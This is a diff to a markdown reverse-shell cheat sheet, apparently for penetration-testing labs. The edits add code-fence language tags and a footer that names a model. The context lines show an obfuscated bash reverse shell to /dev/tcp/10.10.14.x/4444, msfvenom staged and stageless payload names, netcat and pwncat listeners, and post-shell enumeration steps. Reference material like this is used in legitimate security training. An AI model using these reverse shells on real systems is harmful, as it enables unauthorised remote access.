@@ -315,7 +315,7 @@ out.println(s.hasNext() ? s.next() : "");
 
 ### Staged vs Stageless
 
-```
+```text
 linux/x64/shell_reverse_tcp      → stageless (/ not //)
 linux/x64/shell/reverse_tcp      → staged (// means staged)
 windows/x64/meterpreter_reverse_tcp  → stageless meterpreter
@@ -464,7 +464,7 @@ c=bas;h=h;$c$h -i >& /dev/tcp/10.10.14.x/4444 0>&1
 
 ## Quick Reference Checklist
 
-```
+```bash
 1. Set up listener
    - Linux target: nc -lvnp 4444
    - Linux target (better): pwncat-cs -lp 4444
@@ -497,3 +497,9 @@ c=bas;h=h;$c$h -i >& /dev/tcp/10.10.14.x/4444 0>&1
    - ip a / ipconfig
    - Check for docker: cat /.dockerenv
 ```
+
+---
+
+*Created: 2026-02-27*
+*Updated: 2026-05-13*
+*Model: claude-sonnet-4-6*
